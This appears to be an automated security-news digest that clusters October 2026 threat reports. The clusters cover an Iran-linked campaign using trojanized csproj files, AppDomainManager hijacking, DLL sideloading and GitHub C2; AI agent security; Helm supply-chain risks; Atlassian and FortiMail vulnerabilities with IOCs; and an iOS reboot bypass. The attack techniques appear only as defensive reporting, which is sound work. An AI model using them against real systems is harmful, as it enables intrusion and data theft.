  - Summary: Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus.

### Cluster a781629acb — score 12

- Title: Blinder Tunnel Campaign Targets Iraqi Infrastructure
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-06T10:00:33+00:00
- Link: https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- actor_attribution: Nimbus Manticore
- affected_industries: aviation_defense, critical_infrastructure, telecommunications
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- actor_attribution: Nimbus Manticore
- affected_industries: critical_infrastructure, telecommunications, aviation_defense
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Analysis of Blinder Tunnel, an Iran-nexus campaign using fake Dubai Airports recruitment lures and GitHub C2 malware to target critical infrastructure. The post Blinder Tunnel Campaign Targets Iraqi Infrastructure appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Blinder Tunnel Campaign Targets Iraqi Infrastructure 23 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services Cortex Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Unit 42 Published: October 6, 2026 Categories: Malware Threat Research Tags: Advanced Persistent Threat Agent Serpens AppDomainManager GitHub Iran Payload Share Executive Summary We discovered that an Iranian state-aligned threat actor has been masquerading as the Dubai Airports IT department to deliver trojanized coding challenges to high-value targets. Unit 42 tracks the activity as CL-STA-1178. This activity includes a campaign we call “Blinder Tunnel,” that targeted Iraqi critical infrastructure in March 2026, following infrastructure staging that was observed as early as November 2025. We named the campaign Blinder Tunnel after infrastructure terms the attackers used, as well as the malware’s tunneling capabilities. While other security vendors have discussed individual attacks linked to this activity, this is the first report that not only ties together these disparate attacks as related activity, but tracks the evolving 2026 activity and the Blinder Tunnel campaign as a whole. We assess with high confidence that this activity aligns with an Iranian-nexus threat. This campaign expands on previous operations and incorporates a “Peaky Blinders” theme by naming infrastructure components after the British crime drama’s branding — even embedding its theme song into the malware. During our research, we discovered that the attackers established an initial foothold using a three-step attack chain: Exploited legitimate Windows developer .csproj files Performed AppDomainManager hijacking Executed binaries through DLL sideloading These steps enabled the attackers to deploy custom malware that we refer to as ShelbyLoader V2. To blend in with legitimate cloud traffic, the campaign misused GitHub’s API infrastructure for command-and-control (C2) communication. It did so by leveraging repositories to: Fetch decryption keys Download payloads Use GitHub issues as a resilient C2 fallback mechanism GitHub has taken down the malicious infrastructure that we identified as being associated with this campaign. Our investigation benefited from various operational security (OpSec) and cryptographic missteps by the attackers, including: Exposing tools on public repositories Combining phishing and tunneling infrastructure Embedding metadata within the show’s theme song These tactical errors linked Blinder Tunnel infrastructure to a separate campaign in which the same actor leveraged conflict-themed Google Drive lures for credential harvesting against an Israeli entity in May-June 2026. Palo Alto Networks customers are better protected from the Blinder Tunnel campaign through the following products and services: Advanced WildFire Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM Cortex AgentiX Agentic Assistant streamlined this investigation. If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics DLL Sideloading , Screening Serpens , Credential Harvesting Introduction CL-STA-1178 represents activity from an Iranian state-aligned threat actor linked to a series of targeted cyber operations across the Middle East. Previously associated with campaigns tracked by Elastic Security Labs as The Shelby Strategy , the threat actor behind this cluster of activity frequently employs thematic branding in their malware and infrastructure, drawing inspiration from the popular television show “Peaky Blinders.” The attackers behind this cluster target high-value infrastructure, including telecommunications, aviation and other critical entities across Iraq, Israel and the United Arab Emirates (UAE). Since the launch of Blinder Tunnel in March 2026, Unit 42 researchers have
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Blinder Tunnel Campaign Targets Iraqi Infrastructure
  - Published: 2026-10-06T10:00:33+00:00
  - Link: https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/
  - Summary: Analysis of Blinder Tunnel, an Iran-nexus campaign using fake Dubai Airports recruitment lures and GitHub C2 malware to target critical infrastructure. The post Blinder Tunnel Campaign Targets Iraqi Infrastructure appeared first on Unit 42 .

### Cluster f7fb483b20 — score 12

- Title: YARA-X 1.21.0 Release, (Sat, Oct 3rd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-03T14:40:21+00:00
- Link: https://isc.sans.edu/diary/rss/33392
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
YARA-X&#;x26;#;39;s 1.21.0 release brings 5 improvements and 4 bugfixes.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: YARA-X 1.21.0 Release, (Sat, Oct 3rd)
  - Published: 2026-10-03T14:40:21+00:00
  - Link: https://isc.sans.edu/diary/rss/33392
  - Summary: YARA-X&#;x26;#;39;s 1.21.0 release brings 5 improvements and 4 bugfixes.

### Cluster 9adcf13670 — score 12

- Title: Securing Agent-to-Agent Communication: The Next Identity Frontier
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-06T14:11:03+00:00
- Link: https://www.rapid7.com/blog/post/ai-securing-agent-to-agent-communication-next-identity-frontier
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ai_security
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
As organizations deploy autonomous AI agents, security teams face a significant shift as non-human non-human entities making decisions, invoking tools, and delegating tasks to other agents without human intervention. Security architectures built around human users, static APIs, and distinct endpoints break down when AI agents dynamically collaborate across an environment. As these interactions become more common, securing agent-to-agent communication without blocking adoption will require security leaders to treat autonomous agents as first-class identities, with their own permissions, behaviors, and activity to monitor. The operational reality: A new attack surface Consider a standard enterprise scenario where a primary agent delegates a task to a secondary agent, which then queries a production database through the Model Context Protocol and forwards a summary to external infrastructure. Traditional controls may struggle to capture the complete interaction, leaving security teams wit
```

#### Full body

```
Security Operations (SOC) Securing Agent-to-Agent Communication: The Next Identity Frontier Umair Mazhar Oct 6, 2026 | Last updated on Oct 6, 2026 | 4 min read DISCOVER RAPID7 MDR Securing Agent-to-Agent Communication: The Next Identity Frontier Table of contents Securing Agent-to-Agent Communication: The Next Identity Frontier DISCOVER RAPID7 MDR Table of contents As organizations deploy autonomous AI agents, security teams face a significant shift as non-human non-human entities making decisions, invoking tools, and delegating tasks to other agents without human intervention. Security architectures built around human users, static APIs, and distinct endpoints break down when AI agents dynamically collaborate across an environment. As these interactions become more common, securing agent-to-agent communication without blocking adoption will require security leaders to treat autonomous agents as first-class identities, with their own permissions, behaviors, and activity to monitor. The operational reality: A new attack surface Consider a standard enterprise scenario where a primary agent delegates a task to a secondary agent, which then queries a production database through the Model Context Protocol and forwards a summary to external infrastructure. Traditional controls may struggle to capture the complete interaction, leaving security teams without visibility into intent, delegation chains, and scope of authority and introducing five security challenges that deserve particular attention: Identity and delegation chaining requires verifying an agent’s identity while ensuring its delegated authority never exceeds the permissions of the initiating user. Behavioral drift creates detection blind spots because when autonomous agents adapt execution paths dynamically, distinguishing normal operational variance from compromise or prompt injection becomes extremely difficult. Tool and protocol abuse allows agents to invoke APIs and tools autonomously, meaning that without strict guardrails, an agent quickly becomes an unwitting vector for data exfiltration or unauthorized execution. Cascading access can create systemic risk when a compromised high-privilege agent influences secondary agents and expands access across interconnected enterprise systems. Observability gaps arise when fragmented API logs cannot reconstruct multi-agent decision paths or explain why a particular action took place. How agent activity fits existing security operations Agent-to-agent communication can be treated as an extension of the security telemetry teams already collect across users, endpoints, cloud workloads, and applications. Bringing agent identities, delegation paths, tool invocations, and data access into the same investigation model allows existing detection engineering and behavioral analytics practices to evolve alongside agentic workloads. For example, when a user initiates an action through a primary agent that delegates work to a secondary agent, the resulting identity chain and tool activity can be correlated with authentication events, endpoint activity, and network logs. This gives analysts a more complete investigation timeline, from the initiating user through each agent and tool involved. Entity-based context expands the security model beyond users and devices to include AI agents as entities, allowing analysts to trace activity from the initiating user through sub-agents and tools. Behavioral analytics can similarly extend from User Behavior Analytics toward Agent Behavior Analytics. By establishing baselines for how agents normally behave, detection engines can identify anomalies such as unexpected inter-agent communication, sudden privilege escalation, or unusually high-volume transfers. Managed detection and response can incorporate agentic telemetry alongside the users, endpoints, and cloud workloads already monitored. Investigation workflows can then account for agent relationships, delegated actions, and tool invocations as part of
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Securing Agent-to-Agent Communication: The Next Identity Frontier
  - Published: 2026-10-06T14:11:03+00:00
  - Link: https://www.rapid7.com/blog/post/ai-securing-agent-to-agent-communication-next-identity-frontier
  - Summary: As organizations deploy autonomous AI agents, security teams face a significant shift as non-human non-human entities making decisions, invoking tools, and delegating tasks to other agents without human intervention. Security architectures built around human users, static APIs, and distinct endpoints break down when AI agents dynamically collaborate across an environment. As these interactions become more common, securing agent-to-agent communication without blocking adoption will require security leaders to treat autonomous agents as first-class identities, with their own permissions, behaviors, and activity to monitor. The operational reality: A new attack surface Consider a standard enterprise scenario where a primary agent delegates a task to a secondary agent, which then queries a production database through the Model Context Protocol and forwards a summary to external infrastructure. Traditional controls may struggle to capture the complete interaction, leaving security teams wit

### Cluster 39ec553152 — score 12

- Title: Securing the Kubernetes Supply Chain: Introducing WizOS Helm Charts
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-30T15:52:31+00:00
- Link: https://www.wiz.io/blog/wizos-helm-charts
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Secure your Kubernetes supply chain with WizOS Helm Charts. Eliminate hidden CI/CD risks and unmaintained dependencies with hardened, signed, and CVE-scanned charts for seamless Kubernetes deployment.
```

#### Full body

```
Kubernetes changed how teams ship software. Applications now run anywhere, scale on demand, and roll out many times a day, and Helm made that speed even more accessible. Charts package an application with everything it needs to run, so installs are repeatable, versions are tracked, and upgrades or rollbacks take one command. Instead of writing every Kubernetes manifest by hand, you install an ingress controller, a monitoring stack, or a database with a single helm install , often from one of the thousands of community charts on Artifact Hub that someone else maintains. But every one of those installs runs on trust. Helm expands the software supply chain Every chart you install brings its maintainers' decisions with it, including what their projects depend on, how they build and publish releases, and who can change their code. Those decisions sit outside your repositories and your pipelines, which is exactly where traditional supply chain security tools stop looking. Software composition analysis checks your source code and dependency manifests, like go.mod, package.json , and requirements.txt , for vulnerable open source packages. Container image scanning checks the images you build for vulnerable operating system packages and libraries. SBOMs give you a record of what's inside what you ship. Those controls cover the code you own, but a community Helm chart adds gaps they weren't built to cover. You deploy images you never built. A chart pulls images from someone else's registry. Those images never pass through your repositories, so SCA on your source code never sees them. Some risks don't have a CVE. Image scanning looks for known vulnerabilities. It won't tell you that an upstream dependency points to an account anyone can register, or that a maintainer's CI workflow runs code from strangers with access to release credentials. Tags can move. Charts often reference image tags rather than fixed digests, so the image you reviewed last month might not be the image you pull today. Put together, you can do everything right in your own code and still run software whose supply chain you've never had a chance to examine. Introducing secured Helm charts for WizOS Those additional blind spots are why we built secured Helm charts for WizOS. Each chart is ready to deploy, and Wiz maintains it to the same hardening and remediation standards as the WizOS base images your teams already build on. To see how big that gap is in practice, Wiz Research looked at the charts teams use most. The Secured Image Catalog in Wiz, displaying pre-hardened Helm chart options available to swap into your environment. What Wiz Research found behind 1,500 popular Helm charts Wiz Research examined the source repositories and build pipelines behind 1,500 of the most popular Helm charts on Artifact Hub. Many charts share a source repository, so those charts map to 814 unique repositories on GitHub. The goal wasn't to review the charts themselves. It was to look one layer down, at the projects that produce the images each chart deploys. 61 source repositories (7.5%) had at least one confirmed supply chain risk 9 findings were rated critical or high severity 20 charts had weaknesses in their CI/CD workflows 25 charts depended on upstream projects that are unmaintained or archived Two patterns stood out: Build pipelines that trust outside contributors too much. In some projects, opening a pull request, or even leaving a comment, is enough to run an outsider's code inside the project's CI workflow, with access to the project's secrets. When a pull request triggers it, security researchers call this pattern a PWN Request. An attacker who exploits it could steal credentials and use them to change the project or ship a tampered release. Dependencies that nobody owns. Some projects pull code from accounts or namespaces that don't exist. Anyone could register that name, publish malicious code under it, and have that code included in the project's builds. In both cases, th
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Securing the Kubernetes Supply Chain: Introducing WizOS Helm Charts
  - Published: 2026-09-30T15:52:31+00:00
  - Link: https://www.wiz.io/blog/wizos-helm-charts
  - Summary: Secure your Kubernetes supply chain with WizOS Helm Charts. Eliminate hidden CI/CD risks and unmaintained dependencies with hardened, signed, and CVE-scanned charts for seamless Kubernetes deployment.

### Cluster 3db34049d1 — score 12

- Title: Atlassian urges immediate patching of critical Data Center file access vulnerability (CVE-2026-21589)
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-10-06T12:26:30+00:00
- Link: https://www.helpnetsecurity.com/2026/10/06/atlassian-data-center-cve-2026-21589/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Atlassian Confluence, Atlassian Jira, CVE-2026-21589

#### Cluster taxonomy (union across members)
- affected_products: Atlassian Confluence, Atlassian Jira
- cve_ids: CVE-2026-21589
- urgency_signals: preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: Atlassian Confluence, Atlassian Jira
- cve_ids: CVE-2026-21589
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Attackers who know where to look can read files from Atlassian Data Center installations without logging in, the company has warned. About CVE-2026-21589 CVE-2026-21589, a critical arbitrary file access vulnerability with a 9.3 CVSS score, affects all versions of Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible and Fisheye. Atlassian calculated the CVSS 4.0 score through its internal assessment and published … More → The post Atlassian urges immediate patching of critical Data Center file access vulnerability (CVE-2026-21589) appeared first on Help Net Security .
```

#### Full body

```
Sinisa Markovic , Managing Editor, Help Net Security October 6, 2026 Share Atlassian urges immediate patching of critical Data Center file access vulnerability (CVE-2026-21589) Attackers who know where to look can read files from Atlassian Data Center installations without logging in, the company has warned. About CVE-2026-21589 CVE-2026-21589, a critical arbitrary file access vulnerability with a 9.3 CVSS score, affects all versions of Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible and Fisheye. Atlassian calculated the CVSS 4.0 score through its internal assessment and published the advisory on 5 October 2026. “This Arbitrary File Access vulnerability allows an unauthenticated attacker to access specific files within the web application root directory in affected versions,” reads the advisory. “In some configurations, there may be sensitive files present that increase your risk,” Atlassian noted . On the positive side, an attacker has to know the exact name and path of the target file to exploit it, and cannot use it to list or enumerate directory contents. According to the company, the affected cloud products have been patched, its investigation found no evidence of exploitation, and customers using them do not need to take any action. Fixes and temporary mitigations Atlassian urges administrators to immediately upgrade each affected installation to a fixed version or to the latest release. The fixed versions are: Bitbucket Data Center 9.4.26, 10.2.8 and 10.5.1 Confluence Data Center 9.2.26 and 10.2.19 Jira Software Data Center and Jira Service Management Data Center 10.3.26 and 11.3.12 (also 9.12.40 for Jira Software and 5.12.40 for Jira Service Management) Bamboo Data Center 10.2.24 and 12.1.12 Crowd Data Center 6.3.7, 7.0.3, 7.1.7 and 7.2.4 Crucible and Fisheye 4.9.15 Atlassian recommends taking affected instances off the internet, if possible. “Instances accessible to the public internet, including those with user authentication, should be restricted from external network access until you can take action.” The company has also published three temporary mitigations. Atlassian cannot confirm whether customers’ instances have been affected and advises them to have their security teams check all affected instances for evidence of compromise. The advisory does not mention whether the flaw has been exploited against Data Center instances, or who discovered it. More about Atlassian CVE vulnerability Share
```

#### Corroborating sources (2)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Atlassian urges immediate patching of critical Data Center file access vulnerability (CVE-2026-21589)
  - Published: 2026-10-06T12:26:30+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/06/atlassian-data-center-cve-2026-21589/
  - Summary: Attackers who know where to look can read files from Atlassian Data Center installations without logging in, the company has warned. About CVE-2026-21589 CVE-2026-21589, a critical arbitrary file access vulnerability with a 9.3 CVSS score, affects all versions of Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible and Fisheye. Atlassian calculated the CVSS 4.0 score through its internal assessment and published … More → The post Atlassian urges immediate patching of critical Data Center file access vulnerability (CVE-2026-21589) appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical Atlassian Flaw Lets Unauthenticated Attackers Read Known Files Across 8 Products
  - Published: 2026-10-06T06:58:56+00:00
  - Link: https://thehackernews.com/2026/10/critical-atlassian-flaw-lets.html
  - Summary: A critical flaw in 8 Atlassian Data Center products, which customers host themselves, allows an attacker with no login access to read specific files in each product's web application root directory. The attacker must already know a file's exact name and path and cannot list what the directory holds. Atlassian disclosed the flaw, CVE-2026-21589, on October 5, rated it 9.3 out of 10, and

### Cluster 057570cc1b — score 12

- Title: Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-02T05:49:50+00:00
- Link: https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-104286, Fortinet

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: Android, F5 BIG-IP, OpenAI/ChatGPT
- cve_ids: CVE-2026-104286, CVE-2026-85102, CVE-2026-93616, CVE-2026-93952, CVE-2026-94127
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: OpenAI/ChatGPT, Android, F5 BIG-IP
- cve_ids: CVE-2026-104286, CVE-2026-85102, CVE-2026-93616, CVE-2026-93952, CVE-2026-94127
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, added a critical security flaw impacting Fortinet FortiMail to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation. The vulnerability, tracked as CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. "An improper
```

#### Full body

```
Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes  Ravie Lakshmanan  Oct 02, 2026 Vulnerability / Enterprise Security The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, added a critical security flaw impacting Fortinet FortiMail to its Known Exploited Vulnerabilities ( KEV ) catalog, following reports of active exploitation. The vulnerability, tracked as CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. "An improper limitation of a pathname to a restricted directory ('path traversal') [CWE-22] and improper neutralization of NULL byte or NULL character [CWE-158] vulnerability may allow an unauthenticated attacker to write arbitrary files on the underlying system via crafted HTTP or HTTPS requests," Fortinet said in an advisory. The vulnerability impacts the following versions - FortiMail 8.0.0 through 8.0.1 (Upgrade to upcoming 8.0.2 or above) FortiMail 7.6.0 through 7.6.6 (Upgrade to upcoming 7.6.7 or above) FortiMail 7.4.0 through 7.4.8 (Upgrade to upcoming 7.4.9 or above) FortiMail 7.2.0 through 7.2.9 (Upgrade to branch 7.4 or above) Fortinet has acknowledged that the vulnerability has been exploited in the wild, urging customers to apply the following workarounds until fixes are available for certain versions - Disable IBE feature support using the following CLI command: config system encryption ibe set status disable end Disable access to the FortiMail management interface from the internet or restrict access only from trusted private networks. Fortinet credited Gwendal Guégniaud of the Fortinet Product Security team with discovering and reporting the flaw. It has shared the following indicators of compromise - IP addresses - 79.141.169[.]187 45.129.0[.]192 Files - /data/lib/liblog.so (added) /data/bin/webconsole (added) /data/bin/mailservice (added) /data/etc/ld.so.preload (added) /bin/smit (modified) /data/etc/httpd.conf (modified) /data/migadmin.tar.gz (modified) In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply the patch or workarounds by October 4, 2026. The development comes as number of security flaws in Check Point (CVE-2026-85102 and CVE-2026-93616), Arista VeloCloud Orchestrator (CVE-2026-93952), F5 BIG-IP Access Policy Manager (CVE-2026-94127), Cisco Catalyst SD-WAN Manager (CVE-2026-76504), and Citrix NetScaler ADC and NetScaler Gateway (CVE-2026-88771 and CVE-2026-88772) have come under in-the-wild exploitation. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  enterprise security , Fortinet , network security , Vulnerability ⚡ Top Stories This Week ⚡ Weekly Recap: $387M Crypto Hack, Citrix Exploits, AI Agents Go Off-Script, and More Threats Carbonato Botnet Compromises Docker Hosts to Deploy Telegram-Controlled Hermes AI Agent RatHat Android Malware Console Uses Gemini to Identify Higher-Value Victims Apple Patches CoreGraphics Flaw Possibly Exploited in Targeted Attacks OpenAI Shelves GPT-6.1 Astra After Tests Find Deception and Unauthorized Actions Dutch Police Arrest 24-Year-Old Amsterdam Man in ShinyHunters Investigation New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses French Tax Data Theft Using Stolen Staff Passwords Went Undetected for Seven Weeks Citrix NetScaler CVE-2026-88772 Exploit Details Show Pre-Auth Path to Shellcode Execution OpenSSL Fixes High-Severity DTLS Flaw That Can Leak Heap Memory Unencrypted Cisco Warns of Attackers Exploiting Critical Authentication Bypass in SD-WAN Manager Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets Citrix NetScaler Post-Exploitation Payload Creates Superuser, Maps Web Shell to CSS-Like URLs Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft Apple Co
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes
  - Published: 2026-10-02T05:49:50+00:00
  - Link: https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, added a critical security flaw impacting Fortinet FortiMail to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation. The vulnerability, tracked as CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. "An improper

### Cluster 92b29f256d — score 11

- Title: Possible Vulnerability in Apple’s Automatic Reboot
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-10-06T11:06:46+00:00
- Link: https://www.schneier.com/blog/archives/2026/10/possible-vulnerability-in-apples-automatic-reboot.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
404Media is reporting (alternate link ) that a cyber-weapons arms manufacturer is exploiting a vulnerability in iOS to bypass its automatic reboot security feature. This is the feature that automatically puts an iPhone into a more secure state if it hasn’t been used for 72 hours. The new technology to get around inactivity reboot was developed by Magnet Forensics, the company behind GrayKey, a popular tool sold to law enforcement agencies that allows them to unlock and access data stored in iPhones and Android smartphones . Magnet has developed a new device called GrayKey Preserve and a feature for its regular GrayKey devices called Evidence Preservation Mode, according to the video...
```

#### Full body

```
Possible Vulnerability in Apple’s Automatic Reboot 404Media is reporting (alternate link ) that a cyber-weapons arms manufacturer is exploiting a vulnerability in iOS to bypass its automatic reboot security feature. This is the feature that automatically puts an iPhone into a more secure state if it hasn’t been used for 72 hours. The new technology to get around inactivity reboot was developed by Magnet Forensics, the company behind GrayKey, a popular tool sold to law enforcement agencies that allows them to unlock and access data stored in iPhones and Android smartphones . Magnet has developed a new device called GrayKey Preserve and a feature for its regular GrayKey devices called Evidence Preservation Mode, according to the video. “This is an absolute game changer for iOS forensics and a function that I wish we had years ago,” a Magnet employee says in the leaked video, specifically mentioning that the solution is targeted at the iPhone’s inactivity reboot feature and the data it makes unavailable. GrayKey Preserve and Evidence Preservation Mode are also designed to combat another iPhone feature that automatically deletes certain data ­- such as cached locations, and recently deleted photos and iMessages ­- after a certain number of days. “We’re gonna be able to preserve that data for an infinite amount of time.” Presumably, now that Apple engineers know that this flaw exists they can find and fix it. AI turns out to be really good at this sort of thing. Another news article . Tags: iPhone , law enforcement , police , vulnerabilities Posted on October 6, 2026 at 7:06 AM • 3 Comments
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Possible Vulnerability in Apple’s Automatic Reboot
  - Published: 2026-10-06T11:06:46+00:00
  - Link: https://www.schneier.com/blog/archives/2026/10/possible-vulnerability-in-apples-automatic-reboot.html
  - Summary: 404Media is reporting (alternate link ) that a cyber-weapons arms manufacturer is exploiting a vulnerability in iOS to bypass its automatic reboot security feature. This is the feature that automatically puts an iPhone into a more secure state if it hasn’t been used for 72 hours. The new technology to get around inactivity reboot was developed by Magnet Forensics, the company behind GrayKey, a popular tool sold to law enforcement agencies that allows them to unlock and access data stored in iPhones and Android smartphones . Magnet has developed a new device called GrayKey Preserve and a feature for its regular GrayKey devices called Evidence Preservation Mode, according to the video...

### Cluster 24d5e7827d — score 11

- Title: ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T16:45:38+00:00
- Link: https://thehackernews.com/2026/10/threatsday-ai-powered-zero-day-chain.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ai_security
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
This week, the useful words are boring ones: inspect, cache, compile, store, trust. Each sounds harmless. Each can become an attack path when a system does a little more than people expect. A model check can run code. A cache can mix up requests. A public secret can stay useful for years. That is the lesson running through the list. Attackers do not always need a brilliant new trick. They can
```

#### Full body

```
ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories  Ravie Lakshmanan  Oct 01, 2026 Hacking News / Cybersecurity News This week, the useful words are boring ones: inspect, cache, compile, store, trust. Each sounds harmless. Each can become an attack path when a system does a little more than people expect. A model check can run code. A cache can mix up requests. A public secret can stay useful for years. That is the lesson running through the list. Attackers do not always need a brilliant new trick. They can hide commands in public infrastructure, reuse old flaws, abuse weak defaults, or let automation stitch together a rough path that still works. Faster tools are changing the pace, but basic mistakes are still doing plenty of the work. So the interesting question this week is not “what broke?” It is “what did we assume was safe because it looked ordinary?” The full list has answers. The threats change every week. Subscribe, and we’ll alert you when each new ThreatsDay Bulletin is out. ATM jackpotting crackdown U.S. Treasury Sanctions 10 Targets in Connection with ATM Jackpotting The U.S. Treasury's Office of Foreign Assets Control (OFAC) sanctioned 10 targets involved in a Tren de Aragua ATM jackpotting scheme that stole at least $40.73 million from U.S. financial institutions. The network used cryptocurrency to launder the proceeds. Tren de Aragua is a designated Foreign Terrorist Organization. Jackpotting uses Ploutus malware to force ATMs to dispense cash. Treasury estimates show reported losses totaling $40.73 million from more than 1,500 alleged TdA jackpotting attacks in the U.S. as of August 2025. TRM Lab said the seven designated crypto wallet addresses have received approximately $6.1 million in total inflows since March 2022. "Tren de Aragua is using ATM malware as a terrorist financing tool, then moving the cash onto TRON so it looks like ordinary exchange deposits," said Ari Redbord, Global Head of Policy at TRM Labs. "That is the same playbook we keep seeing from FTOs with on-chain infrastructure. These sanctions target that playbook. We are seeing the Treasury go after both the bad actors and their financial facilitators." Blockchain-based malware concealment Use of EtherHiding Grows Cyber threat actors are using public blockchains to conceal malware instructions, making it challenging to seize or take down. This technique, referred to as EtherHiding , is part of a broader approach called Blockchain Dead Drops (BDD). Chainalysis said "North Korean and Iranian-state operators are among those developing distinct blockchain dead drop techniques," adding "BDDs have surged 440% since the launch of Chinese high-capacity open-source AI models that place no restrictions on generating malicious code." AI safety review underway Moonshot AI Conducts Review BBC News has reported that Chinese AI company Moonshot is conducting an internal review after a July 2026 